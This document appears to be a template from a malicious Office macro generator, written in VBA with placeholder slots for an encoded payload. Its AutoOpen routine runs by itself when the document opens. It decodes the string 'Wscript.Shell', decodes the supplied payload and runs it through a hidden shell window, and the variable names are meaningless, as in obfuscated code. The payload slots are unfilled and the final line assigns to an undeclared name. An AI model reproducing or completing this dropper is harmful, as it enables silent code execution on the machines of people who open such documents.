[use:payload_wrapper]
[use:exec]

Sub AutoOpen()
	Dim var1 As String
	Dim var2 As Object
	Dim var3 As Integer
	Dim var4 As String
	
	var3 = [int1]
	var1 = "{[Wscript.Shell]}"
	Set var2 = CreateObject(decode(var1))
	var4 = payload_wrapper("data1")
	var4 = exec(var2, var4, var3)
End Sub

Function payload_wrapper(payload_wrapper1 As String) As String
	Dim payload_wrapper2 As String
	[payload]
	payload_wrapper2 = [payload_args]
	payload_wrapper2 = decode(payload_wrapper2)
	payload_wrapper = payload_wrapper2
End Function

Function exec(exec1 As Object, exec2 As String, exec3 As Integer) As String
	Dim exec4 As String
	Dim exec5 As Integer
	exec5 = [smallint1]
	exec4 = exec2
    If (exec3 > exec5) Then
		exec5 = exec3 - exec3
		exec1.Run exec4, exec5, True
	End If
	exec4 = "exec6"
	func7 = exec4
End Function
